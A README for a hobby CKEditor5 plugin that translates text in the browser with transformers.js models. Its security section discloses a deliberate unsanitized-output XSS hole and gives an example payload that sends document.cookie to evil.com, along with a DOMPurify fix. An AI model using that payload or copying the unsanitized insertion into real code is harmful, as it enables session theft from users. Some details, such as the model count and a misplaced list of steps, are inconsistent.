# CKEditor5 Local Translation Plugin

## What This Is

Vibe code demo. Nothing to see here, just playing around...

A CKEditor5 plugin that runs translation models **100% in your browser** using transformers.js and WebGPU/WebAssembly. No API calls, no server needed.

## Features

- ✅ **Zero Server**: All translation happens locally
- ✅ **9 Model Options**: 3 model families × 3 sizes + custom input
- ✅ **GPU Accelerated**: Uses WebGPU when available
- ✅ **Privacy**: No data leaves your browser
- ✅ **200+ Languages**: Via NLLB-200 model
- ✅ **No Build**: Pure ES modules with importmap

## Demo Controls

### Left Sidebar
- **Model Selector**: Choose from NLLB, MarianMT, M2M100 models
- **Source Language**: Set your input language
- **Custom Model**: Paste any Hugging Face model ID
- **Progress Bar**: Watch model loading in real-time
- **Status**: See current operation state

### Editor Toolbar
- **Translate Button**: Click to show target language options
- **Target Languages**: FI, SV, NO, DK, EN (auto-excludes source)

## How Translation Works

1. User selects text in editor
2. Clicks "Translate" → chooses target language
3. Model runs in browser via transformers.js
4. Translated text replaces selection
5. All logged to console for debugging

## Console Logging

Open browser console (F12) to see:
- Model loading progress and timing
- Translation duration
- Errors and warnings
- Performance metrics

## Project Structure

```
LocalTranslator/
├── index.html              # Main demo page
├── server.py              # Development server (local only)
├── README.md              # This file
├── demo/
│   ├── demo.js           # Demo logic
│   └── styles.css        # Demo styling
└── src/
    ├── plugins/
    │   └── LocalTranslation/
    │       ├── plugin.js       # Main plugin class
    │       ├── ui.js          # Toolbar UI
    │       ├── command.js     # Translation command
    │       └── translation.js  # transformers.js wrapper
    └── utils/
        ├── models.js        # Model configurations
        ├── storage.js       # localStorage helpers
        └── logger.js       # Console utilities
```

## Models

### NLLB-200 (Default)
- **Small (300MB)**: Fast, 200 languages
- **Medium (1GB)**: Balanced speed/quality
- **Large (2GB)**: High quality
- **XL (4GB)**: Best quality

### MarianMT (OpusMT)
- Specialized for specific pairs
- Faster than NLLB for supported pairs
- Excellent for EN↔FI, FI↔SV, etc.

### M2M100
- Supports 100+ languages
- Good multilingual encoder-decoder
- Balanced performance

## Browser Requirements

- **Firefox**: 146+ (for importmap)
- **Chrome**: 89+ (for importmap)
- **Safari**: 16.4+ (for importmap)
- **WebGPU**: Recommended for speed (fallback to WASM)

## Known Issues & Notes

### Model Loading First Time
- Can take 3-5 minutes on slow connections
- Progress bar shows real-time status
- Models are cached after first download

### Translation Quality
- Depends on model size and language pair
- Small models good for simple text
- Large models better for technical content

### Performance
- WebGPU: ~2-5x faster than WASM
- GPU memory affects max model size
- Chrome/Edge has better WebGPU support

## Security Warning

### XSS Vulnerability

This demo has a **reflected XSS vulnerability** in the translation pipeline. The LLM's output is inserted directly into CKEditor5 without HTML sanitization.

**Risk:** An attacker who can influence the translation model's output could inject malicious HTML/JavaScript:
- `<script>` tags
- Event handlers (`onclick`, `onerror`, etc.)
- `javascript:` URLs in attributes
- Data exfiltration via injected scripts

**Example attack vector:**
```
User translates text → LLM returns: <img src="x" onerror="fetch('evil.com?cookie='+document.cookie)">
```

**Mitigation for production:**
1. Add DOMPurify sanitization before inserting HTML:
   ```javascript
   import DOMPurify from 'dompurify';
   const sanitized = DOMPurify.sanitize(llmOutput, {
     ALLOWED_TAGS: ['b', 'i', 'u', 'strong', 'em', 'p', 'br', 'ul', 'ol', 'li', 'a', 'span'],
     ALLOWED_ATTR: ['href', 'title'],
     ALLOW_DATA_ATTR: false
   });
   ```

2. Or configure CKEditor5's HTML Support plugin with strict allowlist

**This demo intentionally lacks sanitization for demonstration purposes. Do not use with untrusted content in production environments.**

## Development

### Local Development

```bash
python3 server.py
```

This starts a local HTTP server at http://localhost:8000. Changes to source files are reflected immediately on page refresh.

**Note:** `server.py` is for local development only.

### Deployment

The project is deployed to **GitHub Pages** at https://ai.wikman.es

Deployment is automatic - push to `main` branch and GitHub Pages deploys from `/` (root).

1. Changes pushed to `main` are deployed automatically
2. No build step required - pure ES modules
3. Access at: https://ai.wikman.es

### Cleanup Tasks (Tech Debt)

- [ ] Remove unused `getLanguageCode()` function from `src/utils/models.js`
- [ ] Remove unused `error()` export from `src/utils/logger.js`
- [ ] Remove unused `performance()` export from `src/utils/logger.js`
- [ ] Remove duplicate `translation-ready` event listeners in `demo/demo.js` (3 identical handlers)
- [ ] Remove or implement `updateUI()` function in `demo/demo.js` (currently just logs)
- [ ] Standardize logging to use `log()` from utils instead of `console.log('[DEBUG]', ...)`
- [ ] Consider splitting large `demo/demo.js` into separate modules

1. Enter model ID in "Custom Model" field
2. Click "Apply Custom"
3. Model loads automatically
4. Available for translation

### Console Debugging

Enable detailed logs:
```javascript
localStorage.setItem('ckeditor-translation-debug', 'true');
```

## License

MIT

## Credits

- [CKEditor5](https://ckeditor.com/)
- [Transformers.js](https://huggingface.co/docs/transformers.js)
- [Hugging Face](https://huggingface.co/)
